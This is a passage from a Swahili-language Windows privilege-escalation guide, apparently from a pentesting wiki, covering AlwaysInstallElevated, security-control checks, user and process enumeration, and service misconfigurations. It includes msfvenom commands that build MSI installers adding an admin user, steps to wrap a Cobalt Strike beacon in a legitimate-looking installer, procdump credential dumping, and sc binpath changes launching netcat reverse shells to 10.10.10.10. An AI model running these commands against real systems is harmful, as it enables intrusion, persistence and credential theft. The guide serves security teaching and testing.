Pata **exploit katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ikiwa** funguo hizi 2 za registry **zimewezeshwa** (thamani ni **0x1**), basi watumiaji wenye kiwango chochote cha ruhusa wanaweza **kusakinisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ikiwa una meterpreter session, unaweza kuendesha technique hii kiotomatiki kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia command `Write-UserAddMSI` kutoka power-up ili kuunda ndani ya directory ya sasa binary ya Windows MSI ya kufanya privilege escalation. Script hii huandika MSI installer iliyokompailiwa mapema ambayo huomba kuongeza user/group (kwa hivyo utahitaji ufikiaji wa GIU):

```
Write-UserAddMSI
```

Tekeleza tu binary iliyoundwa ili kuongeza privileges.

### MSI Wrapper

Soma tutorial hii ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia tools hizi. Kumbuka kuwa unaweza kufunga faili ya "**.bat**" ikiwa **unataka tu** **kutekeleza** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** kwa kutumia Cobalt Strike au Metasploit **Windows EXE TCP payload** mpya katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye kisanduku cha kutafuta. Chagua project ya **Setup Wizard** kisha ubofye **Next**.
- Ipe project jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufikie hatua ya 3 kati ya 4 (chagua files za kujumuisha). Bofya **Add** na uchague Beacon payload uliyotengeneza hivi punde. Kisha ubofye **Finish**.
- Angazia project ya **AlwaysPrivesc** katika **Solution Explorer**, kisha kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
  - Kuna properties nyingine unazoweza kubadilisha, kama vile **Author** na **Manufacturer**, ili kufanya app iliyosakinishwa ionekane halali zaidi.
- Bofya kulia project na uchague **View > Custom Actions**.
- Bofya kulia **Install** na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** kisha ubofye **OK**. Hii itahakikisha kuwa Beacon payload inatekelezwa mara tu installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwishowe, **ijenge**.
  - Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonekana, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **usakinishaji** wa faili hasidi ya `.msi` kwenye **background:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Ili kutumia vulnerability hii, unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vigunduzi

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kinachorekodiwa, kwa hiyo unapaswa kuizingatia.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding; ni muhimu kujua logi zinatumwa wapi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator za ndani**, na kuhakikisha kwamba kila nywila ni **ya kipekee, imetengenezwa bila mpangilio, na inasasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, zinazowaruhusu kuona nywila za admin za ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za maandishi ya kawaida huhifadhiwa ndani ya LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Ulinzi wa LSA

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa kwa Local Security Authority (LSA) ili **kuzuia** michakato isiyoaminika kujaribu **kusoma kumbukumbu yake** au kuingiza msimbo, na hivyo kuimarisha usalama wa mfumo.\
[**Maelezo zaidi kuhusu LSA Protection hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash. [**Maelezo zaidi kuhusu Credential Guard yanapatikana hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Vitambulisho Vilivyohifadhiwa Kwenye Akiba

**Vitambulisho vya domain** huthibitishwa na **Local Security Authority** (LSA) na kutumiwa na vipengele vya mfumo wa uendeshaji. Data ya kuingia ya mtumiaji inapothibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida vitambulisho vya domain vya mtumiaji huanzishwa.\
[**Maelezo zaidi kuhusu Vitambulisho Vilivyohifadhiwa Kwenye Akiba hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia kama kuna vikundi vyovyote ulivyo mwanachama vyenye ruhusa za kuvutia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Vikundi vyenye haki za juu

Ikiwa **uko kwenye kikundi chenye haki za juu, unaweza kuongeza privileges**. Jifunze kuhusu vikundi vyenye haki za juu na jinsi ya kuvitumia vibaya ili kuongeza privileges hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** kuhusu **token** ni nini kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu token za kuvutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions

```bash
qwinsta
klist sessions
```

### Folda za nyumbani

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Sera ya Nenosiri

```bash
net accounts
```

### Pata maudhui ya ubao wa kunakili

```bash
powershell -command "Get-Clipboard"
```

## Michakato Inayoendeshwa

### Ruhusa za Faili na Folda

Kwanza, unapoorodhesha michakato, **angalia kama kuna nywila ndani ya mstari wa amri wa mchakato**.\
Angalia kama unaweza **kubadilisha binary inayoendeshwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia mashambulizi ya [**DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Daima angalia kama kuna [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) zinazoendesha; unaweza kuzitumia vibaya ili kuongeza privileges.

Mchakato wa debugger kusikiliza unaweza kuwa wa muda mfupi, kwa hiyo kutokuwepo kwake kwenye picha moja tulivu ya port hakuthibitishi kwamba haujawahi kufichuliwa. Linganisha listener yoyote uliyoona na PID yake, mmiliki wa process, na uwezo wa mtumiaji mwenye privileges za chini kuifikia; jina la programu au debug flag pekee havithibitishi utekelezaji wa code kati ya watumiaji. Fanya enumeration ya kawaida bila kuingilia, badala ya kutuma amri za debugger.

**Kukagua permissions za binary za michakato**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kukagua ruhusa za folda za binaries za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)****

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Saraka za dynamic preprocessor za Snort

Snort 2 inaweza kupakia shared libraries kutoka kwenye `dynamicpreprocessor directory` iliyotajwa kwenye usanidi uliochaguliwa kwa `snort.exe -c <config>`. Kwa scheduled task au service inayoendesha Snort chini ya akaunti tofauti, kagua usanidi huo halisi na ACL ya saraka ya module iliyotajwa. Ikiwa token yako inaweza kuunda faili hapo, njia hiyo inafaa kukaguliwa kama eneo linaloweza kuruhusu code execution wakati task au service hiyo itakapopakia modules tena. Thibitisha privileges zinazotumika za akaunti ya run-as, usanidi unaotumika, ulinganifu wa modules, na vizuizi vyovyote vya deny au share; saraka inayoweza kuandikiwa pekee haithibitishi privilege escalation. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) inaeleza upakiaji wa modules wakati wa runtime.

### Web service yenye privileges na document root inayoweza kuandikiwa

Kwenye usakinishaji wa Apache wa Windows, linganisha njia ya executable ya service na akaunti ya run-as na `DocumentRoot` iliyo kwenye `httpd.conf` yake inayotumika. Kwa mpangilio wa kawaida wa XAMPP, kagua `C:\xampp\apache\conf\httpd.conf` na ACL ya document root iliyosanidiwa, ambayo mara nyingi ni `C:\xampp\htdocs`. Ikiwa mtumiaji mwenye privileges za chini anaweza kuunda faili kwenye root hiyo huku Apache ikiendeshwa kama `LocalSystem`, code execution ya upande wa server inaweza kuvuka mpaka wa privileges wa host. Thibitisha kuwa service inaendeshwa, njia halisi inatolewa, na handler ya upande wa server inachakata aina hiyo ya faili; root inayoweza kuandikiwa peke yake inathibitisha tu uwezo wa kuunda faili. Kagua ACL bila kuandika faili ya majaribio:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Kwa usakinishaji wa kawaida wa WAMP, service inaweza kuelekeza kwenye `C:\wamp64\bin\apache\apache*\bin\httpd.exe` yenye toleo maalum (au `C:\wamp\...` kwa mpangilio wa 32-bit), ikiwa na usanidi karibu nayo chini ya `conf\httpd.conf` na mzizi chaguomsingi wa `C:\wamp64\www` au `C:\wamp\www`. Kagua pamoja picha halisi ya service, utambulisho inaoendesha nao, `DocumentRoot` inayotumika (pamoja na upanuzi wa `${INSTALL_DIR}` na mibadilisho ya virtual-host), na ACL ya mzizi. Saraka ya WAMP inayoweza kuandikwa haithibitishi kuwa Apache inaendeshwa kama `SYSTEM` au itatekeleza faili iliyowasilishwa. [Apache inaeleza jinsi service ya Windows huchagua usanidi wake](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Mzizi wa IIS unaoweza kuandikwa na utambulisho wa mtandao wa application-pool

Kwa IIS, linganisha saraka halisi inayoweza kuandikwa na **site/application inayotumika** katika `applicationHost.config`, kisha tambua pool iliyosanidiwa na handler ya upande wa server. Msimbo uliowekwa kwenye saraka inayotolewa huendeshwa kama pool tu ikiwa IIS inachakata aina hiyo ya faili na route inaweza kufikiwa. Kagua ruhusa halisi za mtumiaji wa sasa za kuunda faili, hali ya runtime ya site, handler na mibadilisho ya kila path kabla ya kuchukulia saraka inayoweza kuandikwa kuwa utekelezaji wa msimbo.

Uundaji wa ASP.NET wakati wa runtime una njia tofauti ya kukagua: faili zinazozalishwa chini ya saraka ya uundaji ya programu. Chaguo-msingi ni saraka ya `Temporary ASP.NET Files` chini ya usakinishaji husika wa .NET Framework, lakini `<compilation tempDirectory>` ya programu inaweza kuibadilisha. [Microsoft inaeleza mahali ilipo na saraka ndogo za kila programu](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) na [inapendekeza kutenga saraka za uundaji wakati application pool haziaminiani](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ikiwa tokeni yenye ruhusa za chini inaweza kubadilisha source iliyozalishwa kwenye cache ya **programu mahususi**, bainisha kama programu hiyo itaiunda upya chini ya [utambulisho wa worker-process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) wenye ruhusa za juu zaidi. ACL ya faili au saraka pekee haithibitishi utekelezaji wa msimbo: linganisha cache na programu inayotumika, tokeni na ACL zinazotumika, mipangilio ya uundaji, utambulisho wa process, na muda wa uundaji upya wowote. Tumia ukaguzi wa metadata wa kusoma tu; usianzishe uundaji wala kubadilisha faili za cache wakati wa enumerating.

Pool ya IIS iliyosanidiwa kama `ApplicationPoolIdentity` au `NetworkService` kwa kawaida hujiwasilisha kwa rasilimali za domain kwa kutumia **akaunti ya kompyuta mwenyeji**, ingawa tokeni yake ya ndani inaweza kuwa na ruhusa za chini. `LocalSystem` tayari ina ruhusa za juu sana ndani ya kompyuta na pia hutumia akaunti ya kompyuta kwenye mtandao; `LocalService` kwa kawaida huwasilisha vitambulisho vya mtandao visivyojulikana. Pool ya `SpecificUser` hutumia akaunti yake iliyosanidiwa. [Microsoft inaeleza aina hizi za utambulisho](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) na [utambulisho wa mtandao wa application-pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Mpangilio wa utambulisho usipoainishwa unaweza kurithi chaguo-msingi za pool, ambazo hutofautiana kati ya matoleo ya IIS; kwa hiyo, bainisha usanidi halisi badala ya kukisia kutokana na jina la pool. Ikiwa utekelezaji wa msimbo unafikia pool yenye utambulisho wa mtandao wa akaunti ya kompyuta, tathmini ruhusa za directory za **kompyuta hiyo mahususi**. [DCSync](../active-directory-methodology/dcsync.md) huhitaji ruhusa za replication kwenye naming context ya domain; ticket ya akaunti ya kompyuta au jukumu la host pekee havithibitishi ruhusa hizo. Enumerating ya pasivu inapaswa kukagua usanidi na ACL bila kupakia faili, kufanya authentication ya mtandao, au kuomba tickets.

Kwa handler ya ASP.NET inayosomeka na inayoanzisha helper process, fuatilia thamani yoyote inayotokana na request katika hatua za authentication, decryption, validation, na uundaji wa amri. Handler inayounganisha tokeni iliyodecodeiwa kwenye `ProcessStartInfo("cmd", "/c ...")` inaweza kuruhusu alama maalum za shell kubadilisha amri; [Microsoft inaeleza herufi maalum za `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Thibitisha kuwa caller asiyeaminika anaweza kweli kudhibiti thamani iliyodecodeiwa na kufikia handler, kisha bainisha utambulisho halisi wa application-pool au wa impersonation na utambulisho wa child process. Mstari wa source unaosomeka, listener ya localhost, au udhaifu wa umbizo la tokeni pekee havithibitishi utekelezaji wa amri wenye ruhusa za juu. Kagua source na usanidi wa pool bila kutuma requests za kughushi au kuendesha helper wakati wa enumerating ya pasivu.

Kwa service ya PHP kwenye Windows, path inayodhibitiwa na request na kupitishwa kwa [`include` au `require`](https://www.php.net/manual/en/function.include.php) inaweza kutekeleza faili ya PHP inayoweza kuandikwa na mtumiaji wa chini kwa utambulisho wa worker. Thibitisha kuwa request inaweza kufikia kauli hiyo, path iliyotatuliwa inataja faili ambayo mtumiaji wa chini anaweza kubadilisha na worker anaweza kusoma, vizuizi vya PHP vya path vinavyotumika vinaruhusu include, na worker inaendeshwa kwa ruhusa za juu zaidi. Listener ya loopback au faili inayoweza kuandikwa pekee havithibitishi mnyororo huu; kagua source, utambulisho wa service, na ACL za faili bila kuita endpoint wakati wa enumerating ya pasivu.

### Uchimbaji wa nywila kwenye kumbukumbu

Unaweza kuunda memory dump ya process inayoendesha kwa kutumia **procdump** kutoka sysinternals. Services kama FTP zina **credentials katika maandishi ya wazi kwenye kumbukumbu**; jaribu kutupa kumbukumbu na kusoma credentials.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kufungua CMD au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

### Uingizaji wa faili za mradi zenye upendeleo

Programu inayofungua kiotomatiki miradi kutoka kwenye saraka ya drop inayoweza kuandikwa na mtumiaji wa kiwango cha chini huvuka mpaka wa uaminifu wa ingizo kwa kutumia akaunti ya programu inayoingiza. Kagua **njia halisi inayoweza kuandikwa**, mchakato au kazi inayoifungua, utambulisho wake halisi na toleo la parser. [Tatizo la kihistoria la kufungua/kurejesha mradi wa Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) liliruhusu XML external entities kwenye metadata ya mradi; entity ya mtandao kwenye Windows inaweza kusababisha uthibitishaji kutoka kwa akaunti inayoingiza ikiwa [sera za outbound SMB na NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) zinaruhusu. Hili ni kidokezo cha uwezekano wa kufichuka kwa credentials, si ufikiaji wa msimamizi wa moja kwa moja: jibu lazima liweze kutumiwa kupitia njia tofauti iliyoidhinishwa au yenye athari, na matoleo ya sasa lazima yakaguliwe kulingana na hali halisi ya marekebisho yake. Usifungue mradi uliotengenezwa kwa makusudi wakati wa enumeration ya kutofanya mabadiliko; kagua mtiririko wa uingizaji na ACL.

## Services

Ruhusa ya [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) kwenye objekti ya Service Control Manager (SCM) ni tofauti na ruhusa kwenye service iliyopo. Ombi la [`OpenSCManager` la ufikiaji wa kusoma tu](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) lililofaulu kwa ruhusa hiyo ni kidokezo cha ukaguzi, si uthibitisho kwamba service mpya inaweza kuendeshwa. [`CreateService` hurudisha handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) yenye ruhusa za service zilizoombwa wakati wa kuunda; kuifungua tena service baadaye hufanya ukaguzi tofauti wa ruhusa na kunaweza kushindwa hata kama handle ya awali inaweza kutumika. Thibitisha kando tokeni halisi ya ndani au ya mbali, ruhusa za handle zilizotolewa, akaunti ya service, sera ya kuanzisha na njia ya executable. Usitengeneze au kuanzisha service wakati wa enumeration ya kutofanya mabadiliko.

Kwa njia ya kusakinisha service kwa mbali, linganisha ruhusa hizo za SCM na share kwenye target ambayo **logon hiyo hiyo ya mtandao** inaweza kuiandikia, ACL yake ya msingi ya NTFS na njia ya ndani ya executable ambayo akaunti ya service inaweza kuendesha. Akaunti isiyo ya admin inaweza kuvuka mpaka huu ikiwa kuna ruhusa za SCM zilizo pana isivyo kawaida na njia ya kuweka faili; share ya msimamizi si sharti la lazima. Ruhusa ya kuandika kwenye share pekee, au kidokezo cha ruhusa ya kuunda service kwenye SCM pekee, havithibitishi kwamba service mpya inaweza kuanzishwa kwa utambulisho wa juu zaidi.

Service iliyopo inaweza kuita helper executable wakati wa kuanza, kuzima au tukio jingine la mzunguko wa maisha hata kama helper hiyo haipo kwenye `ImagePath` yake. Ikiwa jina la helper linatatuliwa kuwa saraka inayoweza kuandikwa na mtumiaji wa kiwango cha chini na service inaendeshwa kwa utambulisho wa juu zaidi, faili ya helper inayokosekana inaweza kuwa mgombea wa kubadilishwa kwa masharti. Thibitisha **msimbo halisi wa service au mwito wa helper ulioandikwa kwenye nyaraka**, njia ya executable iliyotatuliwa na mpangilio wa utafutaji, ruhusa za kuunda saraka, utambulisho wa service na kichocheo cha mzunguko wa maisha kinachopatikana. Saraka ya service inayoweza kuandikwa au faili inayokosekana pekee havithibitishi kwamba service itapakia faili hiyo; ukaguzi wa kutofanya mabadiliko haupaswi kuanzisha au kusimamisha service.

Kwa service iliyopo, [`SERVICE_START` huruhusu kutoa hoja kwa `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ni tofauti na [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Kagua msimbo wa service au interface yake iliyoandikwa kwenye nyaraka kabla ya kuona ruhusa ya kuianzisha kuwa zaidi ya ruhusa ya kuidhibiti. Ikiwa inatumia hoja iliyochaguliwa na mpigaji kama njia ya log au export, thibitisha utambulisho wa service, mtiririko halisi wa hoja hadi uandishi, vizuizi vya njia na ruhusa za **faili linaloundwa**. Kuandika kwenye saraka iliyolindwa kunaweza kuwa escalation tu ikiwa kuna consumer au loader tofauti yenye upendeleo inayokubali faili hilo; log inayoweza kuandikwa au ruhusa ya kuanzisha pekee havitoshi. Inventory ya kutofanya mabadiliko haipaswi kuanzisha service au kuunda faili ya majaribio.

Kwa agent ya ufuatiliaji ya NSClient++, `nsclient.ini` inayosomeka ni **kidokezo cha kukagua configuration**: inaweza kuwa na web credentials, ilhali `boot.ini` inaweza kuelekeza configuration kwenye eneo jingine. Kagua akaunti halisi ya service, listener ya WEB na sera ya ufikiaji, na ikiwa role iliyothibitishwa inaweza kubadilisha settings au scripts. Utekelezaji wenye upendeleo pia huhitaji `CheckExternalScripts` (au njia nyingine ya utekelezaji iliyowezeshwa), ruhusa halisi ya kusajili au kurekebisha command na kichocheo kinachoiendesha chini ya utambulisho wa service. Listener inayopatikana kwenye loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani, lakini njia ya faili, password au listener pekee havithibitishi ruhusa hizo. Kagua metadata na ruhusa bila kuonyesha siri au kuita web API wakati wa enumeration ya kutofanya mabadiliko. Tazama [mpangilio wa faili wa NSClient++](https://nsclient.org/docs/concepts/file-layout/), [mwongozo wa usalama wa web na scripts](https://nsclient.org/docs/setup/securing/) na [configuration ya external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kwa service ambayo `ImagePath` yake ni `nssm.exe`, kagua akaunti halisi ya service inayotumika na thamani yake ya `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM huhifadhi child application hapo](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), huku `AppDirectory` ikiwa working directory iliyosanidiwa. Kagua executable ya child na ACL za saraka zake za juu kabla ya kuchukulia ruhusa za wrapper kuwa ndizo zinazoweka mpaka mzima wa service. Endpoint ya ndani ya WCF au SOAP inayofichuliwa na child hiyo ni kidokezo tofauti cha ukaguzi: thibitisha kwamba mtumiaji mwenye upendeleo mdogo anaweza kufikia listener, kwamba operation halisi inapokea ingizo lake na kwamba service child hutekeleza operation isiyo salama kwa utambulisho wa juu zaidi. Akaunti ya service, URL ya endpoint au njia inayoweza kuandikwa pekee havithibitishi escalation; epuka kuita operations za service wakati wa enumeration ya kutofanya mabadiliko.

Kwa operation maalum ya WCF, fuatilia string inayodhibitiwa na mpigaji hadi kwenye PowerShell runspace yoyote. [`Pipeline.Commands.AddScript` huongeza maandishi ya script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), na [`Pipeline.Invoke` huendesha pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` yenye Windows transport credentials](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) huthibitisha utambulisho wa client, lakini ruhusa ya kuita operation **hiyo mahususi** na utambulisho halisi wa runspace lazima vikaguliwe kando. Njia kutoka kwenye ingizo la mpigaji mwenye upendeleo mdogo hadi `AddScript` chini ya utambulisho wa service wenye upendeleo zaidi ni mpaka wa utekelezaji wa msimbo; port inayosikiliza, client aliyethibitishwa au method isiyotumika kwenye assembly isiyohusiana pekee havithibitishi hilo. Kagua service iliyosambazwa, contract, ruhusa na settings za impersonation kwa njia tuli bila kuita endpoint wakati wa enumeration.

Service Triggers huwezesha Windows kuanzisha service hali fulani zinapotokea (shughuli za named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kifaa kuunganishwa, GPO kuonyeshwa upya, n.k.). Hata bila ruhusa za SERVICE_START, mara nyingi unaweza kuanzisha services zenye upendeleo kwa kuwasha triggers zake. Tazama mbinu za enumeration na activation hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Service ya Visual Studio ya kukusanya diagnostics

Usakinishaji wa Visual Studio wenye zana za C/C++ unaweza kujumuisha `VSStandardCollectorService150`, service ya diagnostics iliyosanidiwa kuendeshwa kama `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) ilitumia race ya junction na object-manager-link kuelekeza upya uwekaji upya wa DACL ya service. Escalation iliyoonyeshwa pia ilihitaji njia inayoweza kutumika ya kurekebisha MSI ya Visual Studio Setup WMI Provider na target yake ya `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Kipengele hicho kilirekebishwa Januari 2024.

Kwa triage ya kutofanya mabadiliko, kagua akaunti na njia ya binary ya service hiyo pekee, angalia kama njia ya Setup WMI compiler ipo na thibitisha hali ya marekebisho ya kipengele kilichosakinishwa. Entry ya service, toleo la bidhaa ya Visual Studio au faili ya compiler pekee havithibitishi kwamba host ina udhaifu. Ukaguzi hauhitaji kuanzisha service au kutekeleza repair.

Pata orodha ya services:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma.

```bash
sc qc <service_name>
```

Inapendekezwa kutumia binary **accesschk** kutoka _Sysinternals_ kukagua kiwango cha privilege kinachohitajika kwa kila service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Inapendekezwa kuangalia ikiwa "Authenticated Users" wanaweza kurekebisha huduma yoyote:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Wezesha service

Ukipata hitilafu hii (kwa mfano, ukiwa na SSDPSRV):

_Hitilafu ya mfumo 1058 imetokea._\
_Service haiwezi kuanzishwa kwa sababu imezimwa au hakuna vifaa vilivyowezeshwa vinavyohusishwa nayo._

Unaweza kuiwezesha kwa kutumia

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Zingatia kwamba service upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Njia nyingine ya kutatua** tatizo hili ni kuendesha:

```
sc.exe config usosvc start= auto
```

### **Badilisha njia ya service binary**

Katika hali ambapo kundi la "**Authenticated users**" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha binary inayotekelezwa ya service. Ili kurekebisha na kutekeleza **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Anzisha upya huduma

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Haki za ufikiaji zinaweza kuongezwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kusanidi upya binary ya service.
- **WRITE_DAC**: Huruhusu kusanidi upya ruhusa, na hivyo kuwezesha kubadilisha usanidi wa service.
